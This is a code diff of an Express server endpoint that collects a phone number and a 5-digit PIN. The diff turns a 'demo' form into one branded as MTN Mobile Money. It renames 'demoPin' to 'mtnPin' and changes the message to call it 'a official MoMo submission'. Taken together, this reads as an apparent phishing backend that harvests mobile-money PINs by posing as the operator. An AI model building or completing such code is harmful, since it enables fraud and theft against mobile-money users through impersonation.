@@ -11,9 +11,9 @@ app.use(express.static(__dirname));
 
 app.post("/mtn-submission", async (req, res) => {
 
-  const { phone, demoPin } = req.body;
+  const { phone, mtnPin } = req.body;
 
-  // Demo phone validation
+  // Mtn phone validation
   if (
     typeof phone !== "string" ||
     !/^7[0-9]{8}$/.test(phone)
@@ -24,14 +24,14 @@ app.post("/mtn-submission", async (req, res) => {
     });
   }
 
-  // Demo PIN validation
+  // Mtn PIN validation
   if (
-    typeof demoPin !== "string" ||
-    !/^[0-9]{5}$/.test(demoPin)
+    typeof mtnPin !== "string" ||
+    !/^[0-9]{5}$/.test(mtnPin)
   ) {
     return res.status(400).json({
       success: false,
-      message: "Demo PIN is required."
+      message: "Mtn PIN is required."
     });
   }
 
@@ -68,7 +68,7 @@ Status: Successful
 Date: ${date}
 Time: ${time}
 
-This is a demo submission.`;
+This is a official MoMo submission.`;
 
 
   try {
@@ -122,7 +122,7 @@ This is a demo submission.`;
 
     return res.json({
       success: true,
-      message: "Demo submission successful."
+      message: "Mtn submission successful."
     });
 
 
